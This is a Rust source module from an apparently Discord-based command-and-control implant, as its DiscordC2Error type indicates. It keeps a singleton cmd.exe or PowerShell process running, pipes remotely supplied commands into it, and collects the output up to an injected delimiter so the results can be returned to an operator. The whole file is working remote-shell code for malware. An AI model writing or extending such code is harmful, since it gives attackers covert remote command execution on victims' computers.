use std::process::Stdio;
use tokio::io::{AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::process::Command;
use std::sync::Arc;
use tokio::sync::Mutex;
use crate::errors::DiscordC2Error;
use lazy_static::lazy_static;
use tokio::io::AsyncBufReadExt;

pub struct ProcessHandler {
    pub shell_type: String,
    process: Arc<Mutex<tokio::process::Child>>,
}

lazy_static! {
    static ref PROCESS_HANDLER: Mutex<Option<Arc<ProcessHandler>>> = Mutex::new(None);
}

impl ProcessHandler {
    async fn new(shell_type: &str) -> Result<Self, DiscordC2Error> {
        let process = open_shell(shell_type).await?;
        Ok(ProcessHandler {
            shell_type: shell_type.to_string(),
            process: Arc::new(Mutex::new(process)),
        })
    }

    pub async fn instance(shell_type: &str) -> Result<Arc<Self>, DiscordC2Error> {
        let mut process_handler = PROCESS_HANDLER.lock().await;
        if process_handler.is_none() {
            let instance = ProcessHandler::new(shell_type).await?;
            *process_handler = Some(Arc::new(instance));
        }
        Ok(process_handler.as_ref().unwrap().clone())
    }

    pub async fn run_command(&self, command: &str) -> Result<String, DiscordC2Error> {
        let mut process = self.process.lock().await;
        let is_powershell = &self.shell_type == "powershell.exe";
        
        
        // Write the command to the process's stdin
        process.stdin.as_mut().unwrap().write_all(command.as_bytes()).await?;
        if &self.shell_type == "powershell.exe" {
            process.stdin.as_mut().unwrap().write_all(b"; echo ___CMDDELIM___").await?;
        } else {
            process.stdin.as_mut().unwrap().write_all(b" & echo ___CMDDELIM___").await?;
        }
        process.stdin.as_mut().unwrap().write_all(b"\n").await?;
        process.stdin.as_mut().unwrap().flush().await?;

        // Read the process's stdout line by line
        let reader = BufReader::new( process.stdout.as_mut().unwrap());
        let mut lines = reader.lines();
        let mut output = String::new();

        while let Some(line) = lines.next_line().await? {
            if !line.contains("echo") && line.contains("___CMDDELIM___") {
                break;
            }
            output.push_str(&line);
            output.push('\n');
        }

        let formatted_output = if !is_powershell {
            output.replace("& echo ___CMDDELIM___", "")
        } else {
            output.replace("; echo ___CMDDELIM___", "")
        };

        Ok(formatted_output)
    }

    pub async fn exit(&self) -> Result<(), DiscordC2Error> {
        let mut process = self.process.lock().await;

        // Send an exit command to the process's stdin based on the shell type
        let exit_command = match self.shell_type.as_str() {
            "cmd.exe" => "exit",
            "powershell.exe" => "exit",
            _ => panic!("Unsupported shell type"),
        };
        process.stdin.as_mut().unwrap().write_all(exit_command.as_bytes()).await?;
        process.stdin.as_mut().unwrap().write_all(b"\n").await?;
        process.stdin.as_mut().unwrap().flush().await?;

        // Kill the process to ensure it is terminated
        process.kill().await.map_err(|e| DiscordC2Error::from(e))?;

        Ok(())
    }

}

async fn open_shell(shell_type: &str) -> Result<tokio::process::Child, DiscordC2Error> {
    let child = Command::new(shell_type)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .map_err(|e| DiscordC2Error::from(e))?;

    Ok(child)
}
